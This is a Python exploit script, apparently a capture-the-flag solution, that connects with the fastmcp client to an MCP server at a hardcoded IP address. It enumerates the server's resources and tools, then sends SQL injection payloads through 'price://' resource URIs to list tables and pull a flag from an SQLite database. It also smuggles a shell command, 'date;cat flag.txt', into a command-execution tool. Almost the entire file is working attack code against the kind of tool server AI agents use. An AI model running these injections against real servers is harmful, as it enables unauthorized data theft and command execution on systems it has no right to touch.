import asyncio
from fastmcp import Client

client = Client("http://154.57.164.82:31134/mcp/")

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for r in resources:
            print(f"  *** {r.name}")
            print(f"      {r.description.strip()}")

        print("-" * 50)
        print("Resource Templates:")
        for rt in resource_templates:
            print(f"  *** {rt.uriTemplate}")
            print(f"      {rt.description.strip()}")

        print("-" * 50)
        print("Tools:")
        for t in tools:
            params = list(t.inputSchema.get('properties', {}).keys())
            print(f"  *** {t.name}({', '.join(params)})")
            print(f"      {t.description.strip()}")
        
        # Check one item
        try:
            result_object = await client.read_resource("quantity://banana")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")

        # Check an invalid input/item
        try:
            result_object = await client.read_resource("quantity://asd!")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
        
        # Check for SQL Injection - it should return the price
        try:
            result_object = await client.read_resource("price://banana'--")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
        # Now dump the database information with the SQL injection - It shoudl return 1 to confirm the injection
        try:
            result_object = await client.read_resource("price://banana'%20UNION%20SELECT%201--")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
        # Dump the flag with SQL Injection
        # Enumerate tables
        try:
            result_object = await client.read_resource("price://xx'%20UNION%20SELECT%20name%20FROM%20sqlite_master--")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
        # Get the column flag
        try:
            result_object = await client.read_resource("price://x'%20UNION%20SELECT%20sql%20FROM%20sqlite_master%20WHERE%20name='flag'--")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")

        # Get the flag
        try:
            result_object = await client.read_resource("price://x'%20UNION%20SELECT%20flag%20FROM%20flag--")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")
        
        # Command injection
        try:
            result_object = await client.call_tool("execute_server_command", {"command": "date;cat flag.txt"})
            print(result_object.content)
        except Exception as e:
            print(f"[-] {e}")

        # Check the logs and see the errors
        try:
            result_object = await client.read_resource("resource://logs")  # use the real URI from enumeration
            print(result_object[0].text)
        except Exception as e:
            print(f"[-] {e}")


asyncio.run(main())
